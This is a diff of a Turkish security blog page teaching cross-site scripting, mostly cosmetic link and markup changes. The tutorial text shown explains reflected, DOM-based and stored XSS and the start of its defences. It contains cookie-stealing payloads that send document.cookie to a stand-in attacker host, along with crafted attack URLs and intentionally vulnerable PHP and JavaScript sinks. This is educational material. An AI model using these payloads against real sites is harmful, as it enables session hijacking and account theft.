@@ -6,23 +6,23 @@
         <meta name="author" content="Musa ŞANA" />
         <meta name="copyright" content="Musa ŞANA" />
 
-<meta name="keywords" content="xss, xss-döküman, xss-solution, xss-auditor, xss-payload, reflected, dom-based, stored, xss-zafiyeti, xss-auditor, session-hijacking, web-for-pentester-solution, xss-saldırısı, Security, " />
+<meta name="keywords" content="xss, xss-döküman, xss-solution, xss-auditor, xss-payload, reflected, dom-based, stored, xss-zafiyeti, session-hijacking, web-for-pentester-solution, xss-saldırısı, Security, " />
         <title>Cross Site Scripting  · musana.net
 </title>
         <link href="/theme/css/slim-081711.css" rel="stylesheet" type="text/css">
         <link href="/theme/css/bootstrap-combined.min.css" rel="stylesheet">
-        <link rel="stylesheet" type="text/css" href="http://musana.net/theme/css/style.css" media="screen">
-        <link rel="stylesheet" type="text/css" href="http://musana.net/theme/css/solarizedlight.css" media="screen">
-        <link rel="shortcut icon" href="http://musana.net/theme/images/favicon.ico" type="image/x-icon" />
-        <link rel="apple-touch-icon" href="http://musana.net/theme/images/apple-touch-icon.png" />
-        <link rel="apple-touch-icon" sizes="57x57" href="http://musana.net/theme/images/apple-touch-icon-57x57.png" />
-        <link rel="apple-touch-icon" sizes="72x72" href="http://musana.net/theme/images/apple-touch-icon-72x72.png" />
-        <link rel="apple-touch-icon" sizes="114x114" href="http://musana.net/theme/images/apple-touch-icon-114x114.png" />
-        <link rel="apple-touch-icon" sizes="144x144" href="http://musana.net/theme/images/apple-touch-icon-144x144.png" />
-        <link rel="icon" href="http://musana.net/theme/images/apple-touch-icon-144x144.png" />
+        <link rel="stylesheet" type="text/css" href="/theme/css/style.css" media="screen">
+        <link rel="stylesheet" type="text/css" href="/theme/css/solarizedlight.css" media="screen">
+        <link rel="shortcut icon" href="/theme/images/favicon.ico" type="image/x-icon" />
+        <link rel="apple-touch-icon" href="/theme/images/apple-touch-icon.png" />
+        <link rel="apple-touch-icon" sizes="57x57" href="/theme/images/apple-touch-icon-57x57.png" />
+        <link rel="apple-touch-icon" sizes="72x72" href="/theme/images/apple-touch-icon-72x72.png" />
+        <link rel="apple-touch-icon" sizes="114x114" href="/theme/images/apple-touch-icon-114x114.png" />
+        <link rel="apple-touch-icon" sizes="144x144" href="/theme/images/apple-touch-icon-144x144.png" />
+        <link rel="icon" href="/theme/images/apple-touch-icon-144x144.png" />
 	<link href='https://fonts.googleapis.com/css?family=Source+Sans+Pro' rel='stylesheet' type='text/css'>
 	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300" rel="stylesheet"> 
-        <link rel="stylesheet" type="text/css"  href="http://musana.net/theme/css/custom.css" media="screen" />
+        <link rel="stylesheet" type="text/css"  href="/theme/css/custom.css" media="screen" />
     </head>
     <body>
         <div id="content-sans-footer">
@@ -34,14 +34,14 @@
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </a>
-                    <a class="brand" id="musana" href="http://musana.net/"><span class=site-name>musana.net</span></a>
+                    <a class="brand" id="musana" href="/"><span class=site-name>musana.net</span></a>
                     <div class="nav-collapse collapse">
                         <ul class="nav pull-right top-menu">
-                            <li ><a href="http://musana.net/">Anasayfa</a></li>
-                            <li ><a href="http://musana.net/categories.html">Kategori</a></li>
-                            <li ><a href="http://musana.net/tags.html">Etiket</a></li>
-                            <li ><a href="http://musana.net/archives.html">Arşiv</a></li>
-                            <li><form class="navbar-search" action="http://musana.net/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Ara..." name="q" id="tipue_search_input"></form></li>
+                            <li ><a href="/">Anasayfa</a></li>
+                            <li ><a href="/categories.html">Kategori</a></li>
+                            <li ><a href="/tags.html">Etiket</a></li>
+                            <li ><a href="/archives.html">Arşiv</a></li>
+                            <li><form class="navbar-search" action="/search.html" onsubmit="return validateForm(this.elements['q'].value);"> <input type="text" class="search-query" placeholder="Ara..." name="q" id="tipue_search_input"></form></li>
                         </ul>
                     </div>
                 </div>
@@ -56,7 +56,7 @@
 <div class="row-fluid">
     <div class="span2"></div>
     <header class="page_header span8">
-    <h1><a href="http://musana.net/xss-detayli-dokuman.html"> Cross Site Scripting  </a></h1>
+    <h1><a href="/yazilar/2016/xss-detayli-dokuman.html"> Cross Site Scripting  </a></h1>
     </header>
 </div>
 
@@ -162,7 +162,7 @@
 <li>Botnet ağı kurulabilir.</li>
 <li>Kısaca javascript kodu ile yapabileceğiniz her türlü işlemleri yapabilirsiniz. Bu artık üretkenliğinize kalan bir durumdur.  </li>
 </ul>
-<hr/>
+<hr>
 <div class="highlight"><pre><span></span>Beef framework tarayıcı odaklı bir penetrasyon test aracıdır. Bünyesindeki bir çok exploit ile tarayıcıya yönelik ciddi saldırılar gerçekleştirebilir.  
 XSS saldırısı da client side bir saldırı olduğu için bu zafiyet istismar edilirken bazen bu tool kullanılır. Çünkü saldırgana işi daha fonksiyonel, otomatize ve rahat bir şekilde kontrol edebilme avantajı sağlamaktadır.   
 </pre></div>
@@ -177,31 +177,31 @@ XSS saldırısı da client side bir saldırı olduğu için bu zafiyet istismar 
 <li>bir file upload kısmında dosyanın kendisi veya dosyanın adı olabilir.</li>
 <li>...    </li>
 </ul>
-<p>Özetle; kullanıcıdan sunucuya giden herhangi bir verinin bir filtreleme işlemine tabi tutulmadan doğrudan kullanılmasından kaynaklanır. Karşıdaki her zaman sıradan bir son kullanıcı olmayabilir. Bu hiçbir zaman göz ardı edilmemelidir. Geliştirilen her uygulama için kullanıcıları saldırgan olarak düşünüp uygulamayı o yönde geliştirmek gerekir.<br/>
-Basit bir kod;  </p>
+<p>Özetle; kullanıcıdan sunucuya giden herhangi bir verinin bir filtreleme işlemine tabi tutulmadan doğrudan kullanılmasından kaynaklanır. Karşıdaki her zaman sıradan bir son kullanıcı olmayabilir. Bu hiçbir zaman göz ardı edilmemelidir. Geliştirilen her uygulama için kullanıcıları saldırgan olarak düşünüp uygulamayı o yönde geliştirmek gerekir.<br>
+Basit bir kod;  </br></p>
 <div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
 <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">];</span>
 <span class="cp">?&gt;</span>
 </pre></div>
 <p>En kısa anlatımla yukarıdaki kod id parametresinin aldığı değeri ekrana basıyor. Ne güzel :)
-Peki son kullanıcı sıradan değer değilde; html, javascript gibi istemci tarafından çalışan dillerin keywordlerini(veya server side kısmında çalışan diller için özel anlamı olan karakterleri) kullanınca ne olacak? Hiçbir filtreleme işlemi yapılmadığı için tabi ki de paşa paşa çalışacaktır. Çünkü ilgili değerler kaynak kodun syntaxını bozmadığı için düzgün bir şekilde çalışacaktır. Yani kullanıcı <code>cmd</code> parametresine <code>&lt;b&gt;merhaba&lt;/b&gt;</code> değerini yazdığında ekranda bold olarak merhaba yazacaktır. Bu bizim için şunu ifade eder. Html ve JS kullanarak istediğimiz gibi at koşturabiliriz. Ayrıca yukarıdaki kod sadece xss zafiyetine yol açmamaktadır. Eğer cmd parametresindeki değer veritabanına kayıt edilip tekrar yazdırılırsa bu <code>sql injection</code> zafiyetine de sebeb verecektir. İşte kullanıcıdan alınan en ufak bir verinin kontrolu bu kadar önemli!<br/>
-<br/></p>
+Peki son kullanıcı sıradan değer değilde; html, javascript gibi istemci tarafından çalışan dillerin keywordlerini(veya server side kısmında çalışan diller için özel anlamı olan karakterleri) kullanınca ne olacak? Hiçbir filtreleme işlemi yapılmadığı için tabi ki de paşa paşa çalışacaktır. Çünkü ilgili değerler kaynak kodun syntaxını bozmadığı için düzgün bir şekilde çalışacaktır. Yani kullanıcı <code>cmd</code> parametresine <code>&lt;b&gt;merhaba&lt;/b&gt;</code> değerini yazdığında ekranda bold olarak merhaba yazacaktır. Bu bizim için şunu ifade eder. Html ve JS kullanarak istediğimiz gibi at koşturabiliriz. Ayrıca yukarıdaki kod sadece xss zafiyetine yol açmamaktadır. Eğer cmd parametresindeki değer veritabanına kayıt edilip tekrar yazdırılırsa bu <code>sql injection</code> zafiyetine de sebeb verecektir. İşte kullanıcıdan alınan en ufak bir verinin kontrolu bu kadar önemli!<br>
+<br/></br></p>
 <h3 id="xss-turleri"><strong>XSS Türleri</strong></h3>
 <p>XSS saldırısında amaç; hedef kullanıcının tarayıcısında bir şekilde zararlı kod çalışmaktır. Bu amaca ulaşmak için bir kaç farklı yöntem bulunmaktadır. Bu farklılıktan dolayı xss saldırıları şimdilik 3 türe ayrılmıştır. Bizde bu sınıflandırmaya sadık kalarak konuyu anlatacağız.  </p>
 <h4 id="reflected-xss"><strong>Reflected XSS</strong></h4>
-<p>Reflected XSS saldırısında; kurbanın, hedef siteye istek yapması için kullanacağı bağlantıda(link) zararlı kod parçası bulundurmasıdır. İstek yapılırken bu zararlı kod ifa edilir ve dönen cevap saldırganın saldırganın kontrolunde olan bir uzak sunucuya gönderilir. Burada önemli olan nokta; zafiyetin istismar edilmesi tamamen kullanıcının insiyatifine kalan bir durumdur. Yani kullanıcı zararlı kod içeren bağlantıya tıklamadığı sürece zafiyetten etkilenmeyecektir. Ayrıca diğer türlerine oranla en çok karşılaşılan xss saldırı türüdür.<br/>
-GET metoduyla alınan bir <code>q</code> parametresinde reflected xss zafiyeti olan bir sistem tassavur edelim. Yani şöyle;<br/>
-<code>http://zafiyetlisite.com?q=</code><br/>
-Saldırgan böyle bir senaryo karşısında aşağıdakine benzer bir payload kullanacaktır.   </p>
+<p>Reflected XSS saldırısında; kurbanın, hedef siteye istek yapması için kullanacağı bağlantıda(link) zararlı kod parçası bulundurmasıdır. İstek yapılırken bu zararlı kod ifa edilir ve dönen cevap saldırganın saldırganın kontrolunde olan bir uzak sunucuya gönderilir. Burada önemli olan nokta; zafiyetin istismar edilmesi tamamen kullanıcının insiyatifine kalan bir durumdur. Yani kullanıcı zararlı kod içeren bağlantıya tıklamadığı sürece zafiyetten etkilenmeyecektir. Ayrıca diğer türlerine oranla en çok karşılaşılan xss saldırı türüdür.<br>
+GET metoduyla alınan bir <code>q</code> parametresinde reflected xss zafiyeti olan bir sistem tassavur edelim. Yani şöyle;<br>
+<code>http://zafiyetlisite.com?q=</code><br>
+Saldırgan böyle bir senaryo karşısında aşağıdakine benzer bir payload kullanacaktır.   </br></br></br></p>
 <div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"sazan"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">"http://saldirgan.com?snif.php?q="</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
 </pre></div>
-<p><em>Kodun meali;</em><br/>
-Yukarıdaki zararlı kod; sayfada id seçicisinin adı <code>sazan</code> olan bir elementi seçiyor(bu elementin <code>&lt;img /&gt;</code> olduğunu kabul edelim). Ve <code>src</code> niteliğine, saldırganın kontrolunda olan bir hostun adresini atıyor. Bu hostta bulunan sniff.php dosyasına, q paremetresinde kurbanın cookie değeri olacak şekilde get metoduyla bir istekte bulunuyor. Saldırgan da gelen bu isteği kayıt altına alıyor ve böylece hedef kullanıcının oturum bilgisini kendi oturum bilgisi ile değiştirerek giriş yapıyor.(Örnek senaryoda bunun nasıl yapıldığını göreceğiz.)  </p>
+<p><em>Kodun meali;</em><br>
+Yukarıdaki zararlı kod; sayfada id seçicisinin adı <code>sazan</code> olan bir elementi seçiyor(bu elementin <code>&lt;img /&gt;</code> olduğunu kabul edelim). Ve <code>src</code> niteliğine, saldırganın kontrolunda olan bir hostun adresini atıyor. Bu hostta bulunan sniff.php dosyasına, q paremetresinde kurbanın cookie değeri olacak şekilde get metoduyla bir istekte bulunuyor. Saldırgan da gelen bu isteği kayıt altına alıyor ve böylece hedef kullanıcının oturum bilgisini kendi oturum bilgisi ile değiştirerek giriş yapıyor.(Örnek senaryoda bunun nasıl yapıldığını göreceğiz.)  </br></p>
 <p>Yani sonuç olarak saldırgan aşağıda bulunan bağlantıyı bir şekilde kurbana tıklatmak zorundadır. Daha doğru bir şekilde ifade edersek; saldırganın, kurbana aşağıdaki bağlantıya istek yapmasını sağlaması gerekir. İlla tıklaması gerekmez. Kendi kontrolunda olan başka bir site üzerinde bulunan src niteliğine sahip bir elemente aşağıdaki bağlantıyı gömmesi yeterlidir. Kurbanın ruhu bile duymaz. Daha derin düşününce aklıma daha kötü şeyler gelmiyor değil. Neyse :)  </p>
 <div class="highlight"><pre><span></span>http://zafiyetlisite.com?q=<span class="nt">&lt;script&gt;</span>document.getElementById("sazan").src = "http://saldirgan.com?snif.php?q="+document.cookie<span class="nt">&lt;/script&gt;</span>
 </pre></div>
-<p>Ancak... we have a bit of problem. Kim böyle bir bağlantıya tıklar? Sazan olmayan biri olursa böyle bir bağlantıdan işkilenip tıklamayacaktır. Bu tür durumlarda saldırgan link kısaltma servislerini kullanmaktadır. O yüzden her gördüğünüze tıklamayın :) Bazı eklentiler sayesinde kısaltılan linklere tıklamadan da açık halini de görmek mümkündür. Aklınızda olsun.<br/>
-Öte taraftan saldırganın kullanacağı payloadlar sadece bununla sınırlı değil. Örneğin aşağıdaki gibi bir payload ile de saldırgan amacına rahatlıkla ulaşabilir. </p>
+<p>Ancak... we have a bit of problem. Kim böyle bir bağlantıya tıklar? Sazan olmayan biri olursa böyle bir bağlantıdan işkilenip tıklamayacaktır. Bu tür durumlarda saldırgan link kısaltma servislerini kullanmaktadır. O yüzden her gördüğünüze tıklamayın :) Bazı eklentiler sayesinde kısaltılan linklere tıklamadan da açık halini de görmek mümkündür. Aklınızda olsun.<br>
+Öte taraftan saldırganın kullanacağı payloadlar sadece bununla sınırlı değil. Örneğin aşağıdaki gibi bir payload ile de saldırgan amacına rahatlıkla ulaşabilir. </br></p>
 <div class="highlight"><pre><span></span>http://zafiyetlisite.com?q=<span class="nt">&lt;script&gt;</span>document.location.href("http://saldirgan.com?snif.php?q="+document.cookie)<span class="nt">&lt;/script&gt;</span>
 </pre></div>
 <p>Saldırgan, kurbana yukarıdaki bağlantıya istek yapmayı başardığında <code>document.location.href</code> fonksiyonundan dolayı kullanıcı saldırganın belirtiği adrese yönlendirilecektir bu da saldırganın istemediği bir durumdur. Saldırılar daha çok kurbana sezdirmeden yapılmaktır. Bu nedenle ilk payloadımız veya ona benzer payloadlar daha çok tercih edilmektedir. Dediğim gibi payloadlar bunlardan ibaret değil saldırganın amacına ulaşması için birçok farklı payload çeşidi vardır. Ancak hepsinin tek bir amacı vardır;</p>
@@ -226,20 +226,20 @@ HTML DOM, platformdan bağımsız olarak diğer dillerin html ile etkileşime ge
 <div class="highlight"><pre><span></span><span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">'#'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
 <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">x</span><span class="p">);</span>
 </pre></div>
-<p>Yukarıdaki JS kodu; Url içerisinde bulunan <code>#</code> karakter(ler)ini referans alarak url adresini parçalar ve oluşan değerleri bir dizi içerisinde tutar. Oluşan dizideki 2. elemanı(veya indisi 1 olan elemanı) x değişkenine atar ve bu değişkeni <code>document.write</code> ile ekrana basar.<br/>
-Eğer geliştirici web uygulamasının bir yerlerinde böyle bir kod kullanmış ise saldırganın bunu keşfetmesi durumunda geliştireceği payload gayet basittir.<br/>
-<code>http://site.com#&lt;script&gt;alert(1)&lt;/script&gt;</code> <br/>
-Saldırgan yukarıdaki payloadı kullanarak kurbana istek yapmaya çalıştığında <code>#</code> karakterinden sonraki değer sunucuya iletilmeyeceğinden, sunucu tarafında alınmış çok ciddi filtreleme, sanitize, encoding, white list vs. işlemleri olsa bile bu durum dom-based xss zafiyetini engelleyemeyecektir. Çünkü sunucuya <code>#</code> karakterinden sonraki ifade gönderilmeyecektir. <code>#</code> karakterinden önceki istek sunucuya yapılır ve sunucudan cevap döndükten sonra <code>#</code> karakterinden sonraki kod kullanıcının browserı tarafından ifa edilir. Bu saldırı vektörü client side bir yapıya sahip olduğundan dolayı browser geliştiricileri bu durumu çözmek için tarayıcının kendi içinde güvenliği sağlamaya çalışmışlardır. Yukarıdaki js kodunu çalıştırıp payloadı denediğinizde alert alamayabilirsiniz. Çünkü Chrome, <code>XSS Auditor</code> diye adlandırdığı, kullanıcıyı xss saldırılarından korumak için bir güvenlik sağlamış, firefox ise encoding işlemine tabi tutacağından payload çalışmayacaktır. </p>
+<p>Yukarıdaki JS kodu; Url içerisinde bulunan <code>#</code> karakter(ler)ini referans alarak url adresini parçalar ve oluşan değerleri bir dizi içerisinde tutar. Oluşan dizideki 2. elemanı(veya indisi 1 olan elemanı) x değişkenine atar ve bu değişkeni <code>document.write</code> ile ekrana basar.<br>
+Eğer geliştirici web uygulamasının bir yerlerinde böyle bir kod kullanmış ise saldırganın bunu keşfetmesi durumunda geliştireceği payload gayet basittir.<br>
+<code>http://site.com#&lt;script&gt;alert(1)&lt;/script&gt;</code> <br>
+Saldırgan yukarıdaki payloadı kullanarak kurbana istek yapmaya çalıştığında <code>#</code> karakterinden sonraki değer sunucuya iletilmeyeceğinden, sunucu tarafında alınmış çok ciddi filtreleme, sanitize, encoding, white list vs. işlemleri olsa bile bu durum dom-based xss zafiyetini engelleyemeyecektir. Çünkü sunucuya <code>#</code> karakterinden sonraki ifade gönderilmeyecektir. <code>#</code> karakterinden önceki istek sunucuya yapılır ve sunucudan cevap döndükten sonra <code>#</code> karakterinden sonraki kod kullanıcının browserı tarafından ifa edilir. Bu saldırı vektörü client side bir yapıya sahip olduğundan dolayı browser geliştiricileri bu durumu çözmek için tarayıcının kendi içinde güvenliği sağlamaya çalışmışlardır. Yukarıdaki js kodunu çalıştırıp payloadı denediğinizde alert alamayabilirsiniz. Çünkü Chrome, <code>XSS Auditor</code> diye adlandırdığı, kullanıcıyı xss saldırılarından korumak için bir güvenlik sağlamış, firefox ise encoding işlemine tabi tutacağından payload çalışmayacaktır. </br></br></br></p>
 <div class="highlight"><pre><span></span>Chrome bir çok xss payloadını güvenlik nedeniyle engellemektedir. Bu yazının ikinci ana bölümünde anlatığım testleri denerken chrome kullanırsanız büyük ihtimalle örneklerin çoğunda alert alamayacaksınız.(Firefox kullanın.) Bu nedenle xss zafiyeti ararken chromeda (veya başka bir tarayıcıda olabilir) hata almamanız xss zafiyetinin olmadığı anlamına gelmemektedir. Çünkü her tarayıcı bazı standartlara uymayıp kendi standartlarını oluşturmaya/dayatmaya çalıştıklarından dolayı aynı kodlar farklı tarayıcılarda farklı sonuçlar verebilmektedir. Tarayıcıdan tarayıcıya farklı sonuçlar almanız sizi şaşırtmasın yani. Özellikle front-end geliştiricileri bu durumu çok iyi bilmektedir. Buna binaen xss zafiyeti ararken aynı payloadı farklı tarayıcılarda denemekte fayda var.
 </pre></div>
-<p><img alt="firefox-encoding" src="/img/firefox-encoding.png"/><br/>
-Öte taraftan dom based xss client side bir saldırı olduğundan diğer tarayıcılar gibi firefoxda kullanıcılarının bu zafiyetten etkillenmeleri için encoding işlemi yapmaktadır. Mesela firefox <code>#</code> karakterinden sonraki ifadeyi encoding işleminden geçirdiği için yukarıdaki payloadımız firefoxda da çalışmayacaktadır. Firefox, diğer xss türlerinde chrome gibi herhangi bir engelleme yapmamaktadır. Chrome veya firefox'un eski sürümlerinde bu temel payloadlar çalışmaktadır. Kim güncel olmayan bir tarayıcı kullanır ki diyebilirsiniz. Bunlar temel payloadlar olduğu için sezgisel olarak chrome engelleyebiliyor ancak chrome'un yakalayamadığı çok complex payloadlar bulunmaktadır. Ayrıca chrome da bulunan XSS Auditor bypass edilebilmektir.</p>
+<p><img alt="firefox-encoding" src="/img/firefox-encoding.png"><br>
+Öte taraftan dom based xss client side bir saldırı olduğundan diğer tarayıcılar gibi firefoxda kullanıcılarının bu zafiyetten etkillenmeleri için encoding işlemi yapmaktadır. Mesela firefox <code>#</code> karakterinden sonraki ifadeyi encoding işleminden geçirdiği için yukarıdaki payloadımız firefoxda da çalışmayacaktadır. Firefox, diğer xss türlerinde chrome gibi herhangi bir engelleme yapmamaktadır. Chrome veya firefox'un eski sürümlerinde bu temel payloadlar çalışmaktadır. Kim güncel olmayan bir tarayıcı kullanır ki diyebilirsiniz. Bunlar temel payloadlar olduğu için sezgisel olarak chrome engelleyebiliyor ancak chrome'un yakalayamadığı çok complex payloadlar bulunmaktadır. Ayrıca chrome da bulunan XSS Auditor bypass edilebilmektir.</br></img></p>
 <blockquote>
 <p>Bu yazının yayınlanması yeterince geciktiğinden XSS Auditor'un nasıl çalıştığını ve nasıl bypass edileceğini başka bir yazıda ele alacağım İnşallah.</p>
 </blockquote>
-<p><img alt="dom-based-xss" src="/img/dom-based-xss-chrome.png"/><br/>
+<p><img alt="dom-based-xss" src="/img/dom-based-xss-chrome.png"><br>
 Yukarıdaki resim bize bazı noktalarda önemli bilgiler vermketedir. Öncellikle sayfanın kaynak koduna baktığınızda payloadımızın görünmediğini göreceksiniz. DOM based xss zafiyetinde payload sayfanın kaynak kodunda görünmez. Ancak geliştirici araçlarından bakarsanız görebilirsiniz. Yukarıda görmüş olduğunuz üzere geliştirici araçlarından baktığımızda kırmızı olarak görülen bölümde, xss.html dosyasının 12. satırında yer alan kodun tehlike arz etmesinden dolayı <code>XSS Auditor</code>un scriptte yer alan ilgili kodu çalıştırmadığını söylüyor. Google xss zafiyetinin sebeb olacağı tehlikeleri göz ardı etmediğinden kullanıcılarını bu tehtitten korumak için böyle bir güvenlik önlemi almış. Bizi bizden daha çok düşünüyorlar. Eksik olmasınlar(!)
-Kullanırken dikkat edilmediği taktirde dom-based xss zafiyetine sebeb veren js fonksiyonu yukarıda verdiğimiz <code>document.location.hash.split</code> den ibaret değildir. Aşağıdaki js kodu da pek ala dom-based xss zafiyetine sebeb olmaktadır.  </p>
+Kullanırken dikkat edilmediği taktirde dom-based xss zafiyetine sebeb veren js fonksiyonu yukarıda verdiğimiz <code>document.location.hash.split</code> den ibaret değildir. Aşağıdaki js kodu da pek ala dom-based xss zafiyetine sebeb olmaktadır.  </br></img></p>
 <div class="highlight"><pre><span></span>  <span class="kd">var</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
   <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">"Hello "</span><span class="o">+</span><span class="nx">name</span><span class="p">);</span>    
 </pre></div>
@@ -252,20 +252,20 @@ Kullanırken dikkat edilmediği taktirde dom-based xss zafiyetine sebeb veren js
 
 <span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">before</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span>
 
-<span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">prepend</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span><span class="sb">``` </span>
+<span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">prepend</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span> 
 
-<span class="sb">$('#sazan').html('&lt;script&gt;alert(1);&lt;/script&gt;');</span>
+<span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">html</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span>
 
-<span class="sb">$('#sazan').append('&lt;script&gt;alert(1);&lt;/script&gt;');</span>
+<span class="nx">$</span><span class="p">(</span><span class="s1">'#sazan'</span><span class="p">).</span><span class="nx">append</span><span class="p">(</span><span class="s1">'&lt;script&gt;alert(1);&lt;/script&gt;'</span><span class="p">);</span>
 </pre></div>
 <p>Defalarca dedik yine diyelim; Kullanıcının müdahale edebileceği yerlere veya kullanıcıdan değer aldığınız yerlere çok ama çok dikkat ediniz!</p>
 <p>Bu yapının da net anlaşılması adına diyagram üzerinde gösterelim.(Diyagramlar genelde konu başında verilir ama neden ben konu sonunda veriyorum bilmiyorum.)</p>
-<p><img alt="dom-based-xss" src="/img/dom-based-xss.png"/> </p>
+<p><img alt="dom-based-xss" src="/img/dom-based-xss.png"> </img></p>
 <ol>
 <li>Saldırgan hedef sistemdeki dom-based xss zafiyetini kullanarak oturum bilgisini çalmak istediği kullanıcıya payloadı ile beraber linki gönderir.</li>
 <li>Kullanıcı(victim) bağlantıya tıklayıp zafiyetli siteye girer.</li>
-<li>Zafiyetli site kullanıcıya normal bir cevap döner ancak site; kendisini ziyaret eden kullanıcıların yaptığı sorguyu js ile ekrana yazmaktadır.<br/>
-(Payload henüz execute edilmemiştir.)</li>
+<li>Zafiyetli site kullanıcıya normal bir cevap döner ancak site; kendisini ziyaret eden kullanıcıların yaptığı sorguyu js ile ekrana yazmaktadır.<br>
+(Payload henüz execute edilmemiştir.)</br></li>
 <li>Zafiyetli siteden cevap döndükten sonra saldırganın sorgu parametresine yazdığı payload kurbanın tarayıcısı tarafından ifa edilir.</li>
 <li>Kurbanın oturum bilgileri saldırganın sunucusuna gönderilir.</li>
 </ol>
@@ -287,22 +287,22 @@ Kullanırken dikkat edilmediği taktirde dom-based xss zafiyetine sebeb veren js
 <span class="p">}</span>
 <span class="cp">?&gt;</span><span class="x"></span>
 </pre></div>
-<p>Eminim yukarıdaki kodu yazacak junior developerlar bile yoktur artık. Ancak amacım basit bir örnek ile mantığını anlatmak olduğundan böyle bir kod yazdım. Yukarıdaki kodda mysql database ile işlem yaptık ama diğer databaselerde de yukarıdakine benzer fonksiyonlar ile işlem yaptırırsanız durum değişmeyecektir yine. İsterseniz php'deki oracle database ile işlem yapmak için kullanılan <code>oci_*</code> fonksiyonlarını kullanın bir şey değişmeyecektir. Bu gibi düz database işlemleri yaparsanız çok büyük ihtimmale zafiyet bırakırsınız ki php'de zaten artık bu fonksiyonları tavsiye etmiyor ve kullanıcılarının ya mysqli yada pdo kullanmaya zorluyor. Neyse konu fazla dağılmasın. Sonuç olarak kullanıcıdan gelen veriyi temizlemeden doğrudan sql sorgusuna sokulması hem sqli hemde xss zafiyetine sebeb olmaktadır. Yukarıda olan durumda tam olarak bu. Php için PDO sınıfını kullanırsanız filtrelemeler ile uğraşmanıza gerek kalmaz. PDO sınıfı, php ile veritabanı arasında güvenli bir şekilde veri alışverişi yapmak ve diğer veri tabanları desteği sayesinde oldukça kolaylık sağlamaktadır veya orm kullanabilirsiniz. Örnek senaryo bölümünde bu zafiyet türü kullanıldığı için gerekli detayı videoda izleyebilirsiniz.<br/>
-<br/></p>
+<p>Eminim yukarıdaki kodu yazacak junior developerlar bile yoktur artık. Ancak amacım basit bir örnek ile mantığını anlatmak olduğundan böyle bir kod yazdım. Yukarıdaki kodda mysql database ile işlem yaptık ama diğer databaselerde de yukarıdakine benzer fonksiyonlar ile işlem yaptırırsanız durum değişmeyecektir yine. İsterseniz php'deki oracle database ile işlem yapmak için kullanılan <code>oci_*</code> fonksiyonlarını kullanın bir şey değişmeyecektir. Bu gibi düz database işlemleri yaparsanız çok büyük ihtimmale zafiyet bırakırsınız ki php'de zaten artık bu fonksiyonları tavsiye etmiyor ve kullanıcılarının ya mysqli yada pdo kullanmaya zorluyor. Neyse konu fazla dağılmasın. Sonuç olarak kullanıcıdan gelen veriyi temizlemeden doğrudan sql sorgusuna sokulması hem sqli hemde xss zafiyetine sebeb olmaktadır. Yukarıda olan durumda tam olarak bu. Php için PDO sınıfını kullanırsanız filtrelemeler ile uğraşmanıza gerek kalmaz. PDO sınıfı, php ile veritabanı arasında güvenli bir şekilde veri alışverişi yapmak ve diğer veri tabanları desteği sayesinde oldukça kolaylık sağlamaktadır veya orm kullanabilirsiniz. Örnek senaryo bölümünde bu zafiyet türü kullanıldığı için gerekli detayı videoda izleyebilirsiniz.<br>
+<br/></br></p>
 <h3 id="xss-zafiyetinin-cozumu"><strong>XSS Zafiyetinin Çözümü</strong></h3>
 <p>Şimdiye kadar hep bir saldırganın gözüyle sisteme baktık ama bu başlıkta bir devoloper olarak duruma yaklaşacağız ve geliştireceğimiz uygulamalarda xss zafiyeti bırakmamak için bazı ipuçları vereceğiz.</p>
 <h4 id="girdi-kontrolleri"><strong>Girdi Kontrolleri</strong></h4>
-<p>Zafiyete, kullanıcının müdahale edebildiği alanlar veya kullanıcıdan alınan veriler sebeb olduğu için çözümü de burada arayacağız. Girdi denetiminleri çok sıkı sıkıya yapıldığı taktirde bu zafiyet ortaya çıkmayacaktır. Şimdi bu denetimlerde kullanılan kabul görmüş çözüm tekniklerine göz atalım.<br/>
-<br/></p>
+<p>Zafiyete, kullanıcının müdahale edebildiği alanlar veya kullanıcıdan alınan veriler sebeb olduğu için çözümü de burada arayacağız. Girdi denetiminleri çok sıkı sıkıya yapıldığı taktirde bu zafiyet ortaya çıkmayacaktır. Şimdi bu denetimlerde kullanılan kabul görmüş çözüm tekniklerine göz atalım.<br>
+<br/></br></p>
 <h5 id="white-list-teknigi"><strong>White List Tekniği</strong></h5>
